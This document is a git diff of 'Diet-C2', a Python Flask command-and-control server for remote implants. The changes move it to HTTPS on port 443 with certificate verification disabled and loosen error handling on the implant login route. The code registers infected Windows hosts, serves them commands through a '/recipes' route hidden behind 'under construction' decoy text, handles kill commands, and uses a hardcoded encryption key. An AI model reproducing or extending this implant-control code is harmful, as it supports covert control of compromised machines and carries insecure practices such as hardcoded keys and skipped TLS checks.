@@ -3,7 +3,7 @@ from modules import server_codes
 from modules import storage
 from datetime import datetime
 import os
-from flask import Flask, current_app, request, make_response, jsonify, send_from_directory, send_file
+from flask import Flask, current_app, request, make_response, jsonify, send_file
 from werkzeug.utils import secure_filename
 from typing import Dict
 import random
@@ -11,7 +11,7 @@ import requests
 
 # Constants, to be changed via config file or command line params later
 SERVER_IP = "0.0.0.0"
-SERVER_PORT = 80
+SERVER_PORT = 443
 ENC_KEY = "thisisakey:)1234"
 RANDOM_SLEEP = False
 SLEEP_DURATION = 10 # If random sleep is set to true, will have a % and use rand() % (SLEEP_DURATION+1)
@@ -51,7 +51,7 @@ def update_operators(update_type: server_codes.ServerUpdates,data):
         op = operator_db.dict[op_name]
         url = "/update"
         update_json = build_operator_update(update_type, data)
-        requests.post("http://"+op.IP+":"+op.port+url, json=update_json)
+        requests.post("https://"+op.IP+":"+op.port+url, json=update_json, verify=False)
 
 
 # Helper function to build operator update depending on
@@ -77,55 +77,55 @@ def under_construction():
 # The login route for implants
 @app.route("/login", methods=['POST'])
 def implant_register():
-    try:
-        # Read in Base64 post data
-        aes_data = request.get_data()
+    #try:
+    # Read in Base64 post data
+    aes_data = request.get_data()
 
-        # Decrypt it
-        data = AES_INSTANCE.decrypt(aes_data)
-        
-        # Extract the major windows version and the build number
-        major_v = data.split(":::")[0]
-        build_num = data.split(":::")[1]
-        sleep_time = data.split(":::")[2]
-        user = data.split(":::")[3]
+    # Decrypt it
+    data = AES_INSTANCE.decrypt(aes_data)
+    
+    # Extract the major windows version and the build number
+    major_v = data.split(":::")[0]
+    build_num = data.split(":::")[1]
+    sleep_time = data.split(":::")[2]
+    user = data.split(":::")[3]
 
-        # Generate a name
-        new_implant_name = encryption.id_generator(N=4)
-        # Print for debug
-        print(new_implant_name)
-        print(data)
+    # Generate a name
+    new_implant_name = encryption.id_generator(N=4)
+    # Print for debug
+    print(new_implant_name)
+    print(data)
 
-        # Add the new implant to the implant_db
-        implant_db.add_implant(storage.Implant(name=new_implant_name,
-                                               major_v=major_v,
-                                               build_num=build_num,
-                                               sleep_time=sleep_time,
-                                               IP=request.remote_addr,
-                                               user=user
-                                              ))
+    # Add the new implant to the implant_db
+    implant_db.add_implant(storage.Implant(name=new_implant_name,
+                                           major_v=str(major_v),
+                                           build_num=str(build_num),
+                                           sleep_time=int(str(sleep_time)),
+                                           IP=str(request.remote_addr),
+                                           user=str(user)
+                                          ))
 
-        # Update the operators
-        update_operators(server_codes.ServerUpdates.NEW_IMPLANT, implant_db.dict[new_implant_name])
-        print(f"A new implant has connected: {new_implant_name}")
+    # Update the operators
+    update_operators(server_codes.ServerUpdates.NEW_IMPLANT, implant_db.dict[new_implant_name])
+    print(f"A new implant has connected: {new_implant_name}")
 
-        # Set the first contact time
-        implant_db.dict[new_implant_name].last_checkin = datetime.now()
+    # Set the first contact time
+    implant_db.dict[new_implant_name].last_checkin = datetime.now()
 
-        # Respond with the new name as a Cookie header and random text
-        response = make_response(encryption.id_generator(random.randint(200,350)))
-        response.headers["Cookie"] = new_implant_name
-        return response
-    except:
-        print("An implant tried to log in but the /login endpoint error'ed")
-        return server_codes.ServerErrors.ERR_IMPLANT_LOGIN_EXCEPTION.value
+    # Respond with the new name as a Cookie header and random text
+    response = make_response(encryption.id_generator(random.randint(200,350)))
+    response.headers["Cookie"] = new_implant_name
+    return response
+    #except:
+    #print("An implant tried to log in but the /login endpoint error'ed")
+    #return server_codes.ServerErrors.ERR_IMPLANT_LOGIN_EXCEPTION.value
 
 # The command recieve route for implants
 @app.route("/recipes")
 def implant_command():
     try:
         # Read the Cookie header for the implant name
-        implant_name = request.headers['Cookie']
+        implant_name = str(request.headers['Cookie'])
         
         if implant_name not in implant_db.dict:
             return "Site is under construction"
@@ -187,7 +187,7 @@ def implant_response():
         if data[1] == implant_db.dict[implant_name].kill_id:
             del implant_db.dict[implant_name]
             data = {"update_type": server_codes.ServerUpdates.IMPLANT_DELETED.value , "update_data": implant_name} 
-            resp = requests.post("http://"+op.IP+":"+op.port+"/update", json=data)
+            resp = requests.post("https://"+op.IP+":"+op.port+"/update", json=data, verify=False)
             return ret
 
     # If not a kill command response, build a json-able dict to send back to the operator
@@ -197,7 +197,7 @@ def implant_response():
          }
 
     data = {"update_type": server_codes.ServerUpdates.NEW_COMMAND_RESPONSE.value , "update_data": r}
-    resp = requests.post("http://"+op.IP+":"+op.port+"/update", json=data)
+    resp = requests.post("https://"+op.IP+":"+op.port+"/update", json=data, verify=False)
     
     return ret
 
@@ -321,4 +321,4 @@ def op_logout():
 if __name__ == "__main__":
     print(f"Starting Diet-C2 server on {SERVER_IP} on port {SERVER_PORT}")
     # Put the flask server on a seperate thread, continue on to use the CLI interface
-    app.run(host=SERVER_IP, port=SERVER_PORT, debug=False, use_reloader=False)
+    app.run(host=SERVER_IP, port=SERVER_PORT, debug=False, use_reloader=False, ssl_context="adhoc")
